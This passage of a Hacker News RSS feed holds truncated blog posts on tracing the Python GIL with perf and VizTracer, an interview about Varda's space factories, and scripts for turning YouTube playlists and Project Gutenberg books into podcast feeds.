          python 3040114 [031] 5563911.003614:                sched:sched_wakeup: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.083609:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083612:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083613:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R ==&gt; next_comm=ksoftirqd/31 next_pid=198 next_prio=120
          python 3040114 [031] 5563911.108984:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.109059:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.112250:          sched:sched_process_fork: comm=python pid=3040114 child_comm=python child_pid=3040116
          python 3040114 [031] 5563911.112260:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112262:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112273:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112418:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112450:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112473: sched:sched_wake_idle_without_ipi: cpu=31
         swapper     0 [031] 5563911.112476:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112485:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112485:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112489:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112496:                sched:sched_switch: prev_comm=python prev_pid=3040116 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/37 next_pid=0 next_prio=120
         swapper     0 [031] 5563911.112497:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
         swapper     0 [037] 5563912.113490:                sched:sched_waking: comm=python pid=3040116 prio=120 target_cpu=037
         swapper     0 [037] 5563912.113529:                sched:sched_wakeup: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040116 [037] 5563912.113595:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563912.113620:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
         swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></pre>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</a></em></p>]]>
            </description>
            <link>https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777423</guid>
            <pubDate>Thu, 14 Jan 2021 15:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Factories in Space]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25777286">thread link</a>) | @ivankirigin
<br/>
January 14, 2021 | https://www.tango.vc/p/varda | <a href="https://web.archive.org/web/*/https://www.tango.vc/p/varda">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I sat down with <a href="https://twitter.com/zebulgar">Delian Asparouhov </a>who just cofounded Varda Space technologies.&nbsp;</p><p><a href="http://varda.com/">Varda</a> builds factories in space. Dalian is also a principal at <a href="https://foundersfund.com/">Founders Fund</a> who invested in SpaceX. Delian is now moonlighting as both a founder and a VC, which sounds really hard, but it turns out that folks at Founders Fund have done it quite a few times.</p><p>We talk about what that's like and:</p><ul><li><p>How you can iterate quickly on hardware</p></li><li><p>Why we should building factories in space</p></li><li><p>How you can build an early stellar team&nbsp;</p></li><li><p>How we should get more people working on ambitious startups.&nbsp;</p></li></ul><p>Here is the video, and there is a full transcript below.</p><p id="youtube2-Oc9CogVgXN8" data-attrs="{&quot;videoId&quot;:&quot;Oc9CogVgXN8&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}"><iframe src="https://www.youtube-nocookie.com/embed/Oc9CogVgXN8?rel=0&amp;autoplay=0&amp;showinfo=0" frameborder="0" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true"></iframe></p><p><strong>You have a new company called Varda and it's really ambitious. What are you trying to build?</strong></p><p>I've been thinking about orbital manufacturing for quite some time. It’s related to how California became California. It wasn’t paying Lewis and Clark to explore. We became California via the gold rush.</p><p>Low earth orbit manufacturing is the equivalent for space where you can actually significantly accelerate, humanity’s path into the stars by commercializing lower earth orbit. This is as opposed to taking a big spaceship to Mars. That was the SciFi geek motivation behind starting the company.</p><p>The commercial reason to start the company is that there's actually a whole wide array of products that could significantly improve the quality of life for people here on earth that can only be manufactured in microgravity. People think making factories in space sounds crazy. But life here on earth would get better, like cheaper data transmission, a greater supply of human organs, much cheaper, cancer drugs, etc</p><p>There's a wide array of products that can only be manufactured up in space that are useful for people down here on earth. Nobody was solving that problem. I was trying to find a group to invest in and couldn't really find anybody. And so got frustrated and thought “Crap. I just got to do this myself or else it's never going to happen.”&nbsp;</p><p><strong>You are an investor, and now you're starting a new company. This keeps you very busy. How did you decide to do both vs one full time? </strong></p><p>I've mentally tortured myself for years over, even before starting this company: what do I want to do? Do I want to go back and be a founder? if you asked 19-year-old Delian, I was consistent: I wanted to be a founder. I want to be a founding CEO.&nbsp;</p><p>That's what I did. I dropped out of school at 19 and started my first company. Then I took a year-long break working at Teespring. The plan was to rest up and start another company.</p><p>But I couldn't find the right founding team for the company that I wanted to start. Keith Rabois offered for me to join Khosla Ventures. The role was somewhere between an EIR and Chief of Staff. I could learn from him and spend some time finding cofounders for my next startup.</p><p>Then I had an aha moment about eight months into Khosla Ventures. I realized first Venture Capital is the way to do space immediately rather than doing what Bezos and Musk did: making it big in normal tech and funding space companies. I can start funding these space companies today and work on space today. But only as a VC because I thought I wasn’t ready to found a space company myself at the time.</p><p>The second aha moment was that I kept meeting all these founders that are just like much better founders and CEOs than I ever was. I don't think I'm ever going to be a top 1% CEO.&nbsp;</p><p>It comes down to personality traits and working style. I am extremely intellectually curious, ADD, bouncing off the walls, don’t care much for people’s feelings. Those are all huge pros when you're an investor. And those are all big cons if you want to be a really great CEO. I can work the 15 hour days when needed, but I would burn out a lot faster than great CEOs if I needed to do that for a long time.&nbsp;</p><p>So at 8 months in, I thought I could credibly be in the top 1% of VCs. It might take some time, but I have a better shot than being in the top 1% of CEOs. So maybe I should stick to venture longer term.&nbsp;</p><p>For Varda’s incubation, <a href="https://www.linkedin.com/in/will-bruey-8a2b5040/">Will Bruey</a> is the right CEO for Varda. I am not. When you look at him operate and the people he’s recruiting - he’s like a recruiting machine. We’re up to 12 people full time, and we got the cash in the bank literally a week ago. These are extremely experienced engineers: spacecraft, thermal, mechanical. All the types of engineers we need to build a company like this are in his Rolodex.</p><p>I know a handful of SpaceX engineers but it would be slower. The CEO’s primary job is recruiting.</p><p>Sure, there is a bit of a hedge staying a VC. But if Varda fails, who is going to want to take money from a guy who started a company and failed. My neck is on the line either way.&nbsp;</p><p><strong>How do you split your time? Do you have to be in different places?</strong></p><p>Thankfully I don't have to reinvent a lot of this stuff from scratch.</p><p>This is a lot easier doing this three years after Founders Fund incubated <a href="https://www.anduril.com/">Anduril</a>. I can go to our partner <a href="https://foundersfund.com/team/trae-stephens/">Trae Stephens</a> and just copy everything:</p><ul><li><p>The company equity structure to&nbsp;</p></li><li><p>The seed round term sheet with Founders Fund getting common and preferred</p></li><li><p>The same employee offer letters</p></li></ul><p>Anduril’s COO <a href="https://twitter.com/mttgrmm">Matt Grimm</a> has been incredibly helpful getting everything set up.</p><p>I had a long conversation that I've had with Trae Stephens around what he's learned over the past three There are a few key lessons that he taught me.&nbsp;</p><p>First, you have to be regularly at the incubation. You can’t do it totally remotely. We’re both based in SF with the company in LA. You can try to do it ad hoc, but he quickly realized it doesn’t work. The team went through mental gymnastics on when to schedule in-person time. So just be there every Friday. Some Friday’s might not have a lot of Anduril business, but at least he’s there. People know when they can schedule in-person time.</p><p>Second, don't try to segment the days. Both jobs require being very responsive. There's a time where a Founders Fund portfolio CEO just needs to hop on the phone that day and discuss a new term sheet. Same for Varda. So you can’t do a magical segmentation.&nbsp;</p><p>I literally just have two sets of TODO lists, inboxes, and priorities. At Founders Fund I could get to inbox zero. Now that’s impossible. Now it’s: where can I allocate resources to prevent something from exploding? For the past few months, it's been things like making sure we have workman’s comp, an office, and desks, that we’re hiring the right people. Varda has taken up a lot of mental space.&nbsp;</p><p>But now once we get those hires onboarded, they're taking a lot off my plate. We have an IT guy, a head of business development, and a de facto COO. I think at that point, it'll start to get a little bit more evenly balanced. I'll do what a VC does best. I’m a really high-level head of people. I'm great at strategy,&nbsp; fundraising, recruiting. That will be most of my contribution to Varda. I'll jump into the various high-level customer conversations, but we have a guy on the ground that's a lot better at that than I am. He'll rope me in when needed.</p><p>What is the recruiting list coming up and where can I help there? <a href="https://www.linkedin.com/in/will-bruey-8a2b5040/">Will Bruey</a>, the CEO, is gonna be a lot better at recruiting our VP of engineering. When it comes time for us to have a CFO or a CRO, I can significantly help accelerate those types of recruiting campaigns.</p><p>They intermingle. I'll be on an FF call one time. I'll be out Varda call later. There are also the fun ones that are actually both, where I'm talking to a space company that Varda can use and FF might want to fund.&nbsp;</p><p>Even this interview! People are learning about investing and also about Varda.&nbsp;</p><p><strong>For Varda, you haven’t shared the details and timeline for what you’re building. What relationships do you expect? Maybe you have a pharma company that wants to build something and contract with you to build it. Maybe you build the robot that can manufacture that material. Or maybe the most profitable path is to be the only supplier of long carbon nanotubes you sell to others.&nbsp;</strong></p><p><strong>What do you expect to happen from Seed to A over the next year or two?</strong></p><p>We'd like to be more abstracted and just be the “Foxconn of space”, not developing or even designing the product. We're just a step in the supply chain with the most expertise in how to develop it.&nbsp;</p><p>Early on, we have to develop that market and use cases ourselves. We're much more involved in the actual, basic design of the first products. And then we’re also leading those customer conversations.</p><p>Ideally in the long term, when we're starting to work on cancer drugs, Pfizer comes to us and says, this particular drug would benefit from microgravity manufacturing. Here’s the design, manufacture this for us, and handle the supply chain. We deal with microgravity manufacturing, bringing things back down, and delivering it to the customer.</p><p>With Foxconn, their “supplier” is Apple, where they buy designs. But then they are selling the iPhones right back to Apple. That’s the ideal outcome.&nbsp;</p><p>For the first couple of products, it's not going to look like that. We’ll need to make the raw materials ourselves and also figure out the customer side. <a href="https://twitter.com/wolfejosh">Josh Wolfe</a> who joined the board as MD from Lux Capital said this first product is kind of like training wheels. The point is not to develop that product. The point is to develop that whole supply chain and then be able to apply that supply chain to a lot of different products.</p><p>It doesn’t matter if that first product is profitable or perfect. Generate some revenue so you can show it’s commercially viable.&nbsp;</p><p><strong>When it comes to venture for super deep tech, often by Series A or even B, companies often don’t have any revenue. But for a B2B SaaS product, you're definitely judged by retention, revenue, and other metrics. Where do you think it will be on that spectrum? Those training wheels can take you down the driveway or down the block.&nbsp;</strong></p><p><strong>My presumption is that you're gonna have to raise a lot of money. The market is completely new, so maybe you need to prove the market exists. Or maybe you just need to prove the technology works. What do you expect?&nbsp;</strong></p><p>Thankfully space …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tango.vc/p/varda">https://www.tango.vc/p/varda</a></em></p>]]>
            </description>
            <link>https://www.tango.vc/p/varda</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777286</guid>
            <pubDate>Thu, 14 Jan 2021 15:17:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Achieving flow while making podcasts from YouTube and Project Gutenberg]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777183">thread link</a>) | @whatrocks
<br/>
January 14, 2021 | https://www.charlieharrington.com/flow-and-creative-computing | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/flow-and-creative-computing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently watched Pixar's SOUL and I loved its depiction of being <em>in the zone</em>:</p>
<p><span>
      <span></span>
  <img alt="In the Zone" title="In the Zone" src="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png" srcset="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/222b7/zone.png 163w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/ff46a/zone.png 325w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png 650w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/e548f/zone.png 975w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/3c492/zone.png 1300w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/769f8/zone.png 1924w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>This is a beautiful, astrally-projected depiction of Mihaly Csikszentmihalyi's <em>flow</em> concept. For the unfamiliar, here's how Csikszentmihalyi describes flow, or <em>the optimal experience</em>:</p>
<blockquote>
<p>It is what the sailor holding a tight course feels when the wind whips through her hair, when the boat lunges through the waves like a colt -- sails, hull, wind, and sea humming a harmony that vibrates in the sailor's veins. It is what a painter feels when the colors on the canvas begin to set up a magnetic tension with each other, and a new <em>thing</em>, a living form, takes shape in front of the astonished creator.</p>
</blockquote>
<p>That sounds pretty good, right? Csikszentmihalyi contends that flow is how we humans can achieve happiness. And it's not something that's given; it's something we have to cultivate and grow and work towards. I cannot recommend his book enough.</p>
<p>Even better was SOUL's depiction of the non-flow state - the lost souls:</p>
<p><span>
      <span></span>
  <img alt="lost souls" title="lost souls" src="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg" srcset="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/d2f63/lost-souls.jpg 163w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/c989d/lost-souls.jpg 325w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg 650w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/7c09c/lost-souls.jpg 975w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/a2510/lost-souls.jpg 1000w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>Definitely been there. Usually its whenever I hear, "Can you see my screen?" These poor creatures wander the astral plane, lost and unhappy and unsure why.</p>
<p>Luckily, the movie tells us it's never too late, and I believe them.</p>
<p>So, how do we achieve flow?</p>
<p>It's the deliberate combination of skill meeting challenge. More from Csikszentmihalyi:</p>
<blockquote>
<p>The best moments usually occur when a person's body or mind is stretched to its limits in a voluntary effort accomplish something difficult and worthwhile.</p>
</blockquote>
<p>This post documents a legitimate flow experience I had last week that began with an observation about my podcast addiction.</p>
<h2>All My Best Friends are Podcasts</h2>
<p>Yes, that's a <a href="https://www.youtube.com/watch?v=Z_63ZZRLylE">Less Than Jake</a> reference. You're welcome, 8th-Grade Charlie.</p>
<p>And, if you're at all like 28th-Grade Charlie, then you're also helplessly addicted to podcasts.</p>
<p>I listen all the time -- while I'm washing dishes, folding laundry, performing my daily Amazon cardboard box cutting ritual, even taking showers. Carly doesn't understand it, and I certainly can't explain it.</p>
<p>Am I that afraid of silence? My own thoughts? Am I so lonely for friendship that I even found this evisceration quietly comforting?</p>
<blockquote><p lang="en" dir="ltr">Podcasts saying literally nothing for 20 minutes. <a href="https://t.co/nmfka1Gjsp">pic.twitter.com/nmfka1Gjsp</a></p>— Jonathan Ogden (@jogdenUK) <a href="https://twitter.com/jogdenUK/status/1346442437376552962?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote> 
<p>I know too much about ancient Rome to be able to answer these questions.</p>
<p>So, if I'm just going to accept my Overcast overlords, can I turn the tides on this one-directional relationship?</p>
<p>Yes. We can. Enter: the spark of an idea.</p>
<h2>Create a podcast from the audio of YouTube videos</h2>
<p>If I can't control what my favorite podcast hosts are talking about in any given episode, can I instead choose <em>exactly</em> what I want to listen to? What if there were a virtually unlimited source of content to consume? Surely, I could then be more deliberate in my listening habits.</p>
<p>YouTube is our answer. I've been collecting computer science talks and lectures in playlists that I always mean to "watch later" and never do. Fact is, I don't want to watch a YouTube video. I rarely ever sit down and "watch YouTube" (other than The 8-Bit Guy cleaning old VIC-20s). It's not part of my routine. I'm usually moving around too much.</p>
<p>YouTube also makes it really hard to consume something "on the go." You need to pay for their PiP or minimized mode, I think.</p>
<p>Then I found this <a href="https://benjamincongdon.me/blog/2020/03/02/Creating-a-Podcast-Feed-from-a-YouTube-Playlist/">post by Benjamin Congdon</a>: a simple way to create an audio podcast feed from a YouTube playlist using a <a href="https://amzn.to/3qksZiq">Raspberry Pi</a> home server. His tutorial leverages an open source project called <a href="https://github.com/mxpv/podsync/">PodSync</a>, which itself leverages <code>ffmpeg</code> and, everyone's favorite controversy, <code>youtube-dl</code>, behind the scenes to download audio from YouTube and generate a podcast RSS feed. This, this, is exactly what I was looking for!</p>
<p>Nothing to add here, other than bravo, Benjamin. I was able to follow his tutorial pretty much straight through.</p>
<p>Wait, I do have something to add. Benjamin suggests using <code>rsync</code> to upload your mp3s and xml RSS feed to s3 or the like. I did this initially, but I didn't like the idea of having to mark these files as <code>public</code> on s3 in case of some huge accidental traffic surge.</p>
<p>So I came up with another idea:</p>
<ul>
<li>Create a public repo on GitHub and enable GitHub Pages (mine is <a href="https://github.com/rockswhat/listener">here</a>)</li>
<li>Init the repo in your <code>/data</code> directory on the Raspberry Pi (this is the directory with the generated <code>.xml</code> RSS feed and <code>mp3</code> audio files)</li>
<li>Change your Podsync config's hostname to your GitHub Pages site: </li>
</ul>
<div data-language="text"><pre><code>hostname = "https://rockswhat.github.io/listener"`</code></pre></div>
<ul>
<li>Change your cron command to push to your repo (instead of <code>rsync</code> to s3):</li>
</ul>
<div data-language="text"><pre><code>*/15 * * * * cd /home/pi/podsync/data &amp;&amp; git add . &amp;&amp; git commit -m "update feed" &amp;&amp; git push origin main</code></pre></div>
<p>Voila! My own podcast feed of YouTube videos, publicly available on the Internet. You can add my feed to Overcast (or your favorite podcast player) with its XML URL:</p>
<div data-language="text"><pre><code>https://rockswhat.github.io/listener/listen_laterz.xml</code></pre></div>
<h3>C'mon, you really achieved flow from <em>that</em>?</h3>
<p>No, not really, but <em>almost</em>. Tutorials, good ones, at least, are guided paths toward some goal, with micro-feedback and mini-frustrations along the way. And these things are well-suited to flow. They can lead you to flow.</p>
<p>In my case, this tutorial got my gears turning. Which now gets us into to the <code>creative computing</code> side of this article.</p>
<p>I think it's important to remind ourselves to have fun with our computers. To use them to make art, make music, create weird stuff, just because we can. There's so much on our computers and phones now thanks to the Internet that can warp our minds and render us into Lost Souls. We often forget the simple joys of computers of the past, back when they were bicycles for the mind, and used adorable floppy disks or CD-ROM drives for games and encyclopedias. I know there's so much "more" that we can do with computers, but we need to remember that they are here to work for us, and not the other way around.</p>
<p>As soon as I saw Overcast fill up with audio from my <code>Listen Laterz</code> YouTube playlist, I knew I needed to keep going, to see what else I could render from clay into podcast feeds.</p>
<h2>Creating a podcast audiobook from Project Gutenberg e-books</h2>
<p>Where else can we find a giant repository of open content on the Internet that also happens to be inconvenient to consume?</p>
<p>Hello, <a href="https://www.gutenberg.org/">Project Gutenberg</a>! </p>
<p>Project Gutenberg is just about the coolest --- and one of the most important -- things on the internet. The fact that it was <a href="https://en.wikipedia.org/wiki/Project_Gutenberg">started on the ARPANET in 1971</a> blows my mind. That is some creative, forward-thinking from its founder Michael S. Hart.</p>
<p>My idea here is simple: pick a public domain book, chop it up into chapters, convert the chapters to audio, and then generate an xml RSS feed.</p>
<p>I picked Mary Shelley's <a href="https://www.gutenberg.org/files/84/84-h/84-h.htm">Frankenstein</a>, because, why not? I already read it a few years ago during my October "Spooky Reads" habit, but I figured it's the perfect candidate for re-animation.</p>
<p>If you've clicked the link to the text on Project Gutenberg, you'll see it's a plaintext nightmare. I'm not ashamed to admit here that I manually just chopped it up into separate text files, rather than writing a script to somehow do this for me. Whatever, ok?</p>
<p>First let's make some files.</p>
<div data-language="bash"><pre><code><span>cd</span> pieces
<span>touch</span> intro.txt
<span>touch</span> letter-<span>{</span><span>1</span><span>..</span><span>4</span><span>}</span>.txt
<span>touch</span> chapter-<span>{</span><span>1</span><span>..</span><span>24</span><span>}</span>.txt
<span>touch</span> license.txt</code></pre></div>
<p>And then we copy-pasta.</p>
<p>Now that I've got my chapters (aka future podcast episodes) all set, we're ready to convert them to audio. What's the easiest way I can do that?</p>
<p>My "in-the-zone" brain suggests using the terminal's <code>say</code> command. I've used this command a few years ago in one of my earliest creative computing projects: a <a href="https://www.charlieharrington.com/terminal-man-live-in-nyc">live musical performance from a telepresence robot</a>).</p>
<p>Surely, I can write a neat little script to loop through my text files and <code>say</code> them into an <code>mp3</code>. Some Googling for <a href="https://stackoverflow.com/questions/16501663/macs-say-command-to-mp3">advice</a>, and I've soon got this Bash script going:</p>
<div data-language="bash"><pre><code><span>for</span> <span>i</span> <span>in</span> *.txt<span>;</span>
<span>do</span>
    <span>echo</span> <span>"processing <span>$i</span>..."</span><span>;</span>
    <span>name</span><span>=</span><span><span>$(</span><span>echo</span> <span>"<span>$i</span>"</span> <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'.'</span><span>)</span></span>
    say -v Vicki -f <span>$i</span> -o aiff/<span>$name</span>.aiff
    lame -m m aiff/<span>$name</span>.aiff mp3/<span>$name</span>.mp3
    <span>rm</span> aiff/<span>$name</span>.aiff
<span>done</span></code></pre></div>
<p>And it works! Checkpoint reached! The <code>mp3</code> files are now sitting happily in their respective <code>/mp3</code> folder. I experience a fleeting moment of joy, and then immediately plunge into the next challenge: generating an XML feed.</p>
<p>My hack-y brain suggests another copy-pasta. Let's take the feed generated by the Podsync library in the section above, replace pieces of it with Bash variables, and then loop through my text files to jam in the values I want.</p>
<p>More googling ensures, including learning a bit more about <a href="https://en.wikipedia.org/wiki/Here_document#:~:text=In%20computing%2C%20a%20here%20document,it%20were%20a%20separate%20file.">heredocs</a>, and I've eventually got this script:</p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>


<span>PODCAST_TITLE</span><span>=</span><span>"Castellan - Frankenstein"</span>
<span>PODCAST_AUTHOR</span><span>=</span><span>"Castellan"</span>
<span>CATEGORY</span><span>=</span><span>"Technology"</span>
<span>GENERATOR</span><span>=</span><span>"Castellan"</span>
<span>LINK</span><span>=</span><span>"https://whatrocks.github.io/castellan/"</span>
<span>IMG</span><span>=</span><span>"https://whatrocks.github.io/castellan/showart.jpg"</span>


<span>CURRENT_DATE</span><span>=</span><span><span>$(</span><span>date</span> -R<span>)</span></span>


<span>EPS</span><span>=</span><span>(</span>
  intro
  letter-1
  letter-2
  letter-3
  letter-4
  chapter-1
  chapter-2
  chapter-4
  chapter-3
  chapter-5
  chapter-6
  chapter-7
  chapter-8
  chapter-9
  chapter-10
  chapter-11
  chapter-12
  chapter-13
  chapter-14
  chapter-15
  chapter-16
  chapter-17
  chapter-18
  chapter-19
  chapter-20
  chapter-21
  chapter-22
  chapter-23
  chapter-24
  license
<span>)</span>

<span>read</span> -d <span>''</span> feed <span>&lt;&lt;</span> <span>EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"&gt;
  &lt;channel&gt;
    &lt;title&gt;<span>$PODCAST_TITLE</span>&lt;/title&gt;
    &lt;link&gt;<span>$LINK</span>&lt;/link&gt;
    &lt;description&gt;<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)&lt;/description&gt;
    &lt;category&gt;<span>$CATEGORY</span>&lt;/category&gt;
    &lt;generator&gt;<span>$GENERATOR</span>&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;lastBuildDate&gt;<span>$CURRENT_DATE</span>&lt;/lastBuildDate&gt;
    &lt;pubDate&gt;<span>$CURRENT_DATE</span>&lt;/pubDate&gt;
    &lt;itunes:author&gt;<span>$PODCAST_AUTHOR</span>&lt;/itunes:author&gt;
    &lt;itunes:subtitle&gt;<span>$PODCAST_TITLE</span>&lt;/itunes:subtitle&gt;
    &lt;itunes:summary&gt;&lt;![CDATA[<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)]]&gt;&lt;/itunes:summary&gt;
    &lt;itunes:image href="<span>$IMG</span>"/&gt;
    &lt;itunes:explicit&gt;no&lt;/itunes:explicit&gt;
    &lt;itunes:category text="<span>$CATEGORY</span>"&gt;&lt;/itunes:category&gt;
EOF</span>

<span>echo</span> <span>$feed</span>

<span>COUNT</span><span>=</span><span>1</span>
<span>for</span> <span>episode</span> <span>in</span> <span>${EPS<span>[</span>@<span>]</span>}</span><span>;</span>…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.charlieharrington.com/flow-and-creative-computing">https://www.charlieharrington.com/flow-and-creative-computing</a></em></p>]]>
            </description>
            <link>https://www.charlieharrington.com/flow-and-creative-computing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777183</guid>
            <pubDate>Thu, 14 Jan 2021 15:10:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scraping HN content with declarative programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777119">thread link</a>) | @wilkerlucios
<br/>
January 14, 2021 | https://pathom3.wsscode.com/docs/tutorials/hacker-news-scraper | <a href="https://web.archive.org/web/*/https://pathom3.wsscode.com/docs/tutorials/hacker-news-scraper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this tutorial, we are going to write a scraper to extract information from hacker
news pages using Pathom.</p><p>Pathom enables declarative programming for data processing.</p><p>Using Pathom, we will map out the data from Hacker News in attributes, and then we use
